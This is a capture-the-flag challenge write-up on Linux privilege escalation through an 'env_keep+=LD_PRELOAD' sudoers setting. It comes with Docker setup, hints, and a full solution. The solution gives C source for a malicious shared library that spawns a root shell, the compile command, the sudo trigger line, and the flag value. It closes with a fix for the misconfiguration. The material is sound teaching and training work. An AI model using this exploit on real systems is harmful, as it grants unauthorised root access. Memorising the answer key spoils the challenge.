# Challenge 3  LD_PRELOAD Injection via Sudo

**Difficulty:** Medium  
**Category:** Linux Privilege Escalation  
**Flag:** `/root/flag.txt`

---

## Story

The sysadmin allowed you to restart the web server as root via sudo.
They also left one dangerous line in the sudoers config.
One compiled shared library is all you need.

You are `player`.

---

## Setup

```bash
docker build -t ctf-linux-med-3 .
docker run -it --rm ctf-linux-med-3
```

---

## Background: LD_PRELOAD

`LD_PRELOAD` is an environment variable that tells the dynamic linker to load a
shared library *before* any other library  including libc. This lets you override
any standard library function.

Normally, sudo strips dangerous environment variables before running the target command.
But if the sudoers file contains `env_keep+=LD_PRELOAD`, your `LD_PRELOAD` survives
into the root-privileged process. Your malicious library loads as root.

---

## Hints

<details>
<summary>Hint 1</summary>
Check your sudo rights and the sudoers environment settings:

```bash
sudo -l
```

Look for `env_keep` lines in the output.
</details>

<details>
<summary>Hint 2</summary>
Write a small C shared library with a constructor function that runs at load time.
A constructor runs before `main()`  so it runs before the target binary does anything:

```c
#include <stdio.h>
#include <unistd.h>
void __attribute__((constructor)) init() {
    // This code runs as root when the library is loaded
}
```

Compile it as a shared library:
```bash
gcc -shared -fPIC -o /tmp/evil.so evil.c
```
</details>

<details>
<summary>Hint 3</summary>
The constructor should spawn a shell or copy the flag.
Then run:
```bash
sudo LD_PRELOAD=/tmp/evil.so /usr/sbin/apache2
```
</details>

---

## Solution

<details>
<summary>Click to reveal  try on your own first!</summary>

### Step 1  Check sudo configuration

```bash
sudo -l
```

Output:
```
Defaults env_keep+=LD_PRELOAD
(root) NOPASSWD: /usr/sbin/apache2
```

`env_keep+=LD_PRELOAD` means our `LD_PRELOAD` variable is preserved when sudo runs.

### Step 2  Write the malicious shared library

```bash
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF
```

Compile it:
```bash
gcc -shared -fPIC -nostartfiles -o /tmp/evil.so /tmp/evil.c
```

### Step 3  Trigger via sudo

```bash
sudo LD_PRELOAD=/tmp/evil.so /usr/sbin/apache2
```

`apache2` runs as root. Before `main()` is called, the dynamic linker loads `evil.so`
and executes `init()`. `init()` calls `setuid(0)` and spawns a root shell.

### Step 4  Read the flag

```bash
cat /root/flag.txt
```

```
CTF{ld_pr3l04d_w1th_sud0}
```

### Why this works

`env_keep+=LD_PRELOAD` in sudoers tells sudo not to strip that variable.
This is always a misconfiguration  `LD_PRELOAD` with a root-privileged process
gives you full code execution as root. The correct sudoers configuration either
omits `env_keep` entirely or uses `env_reset` (the default) which strips all
environment variables not explicitly allowlisted.

</details>
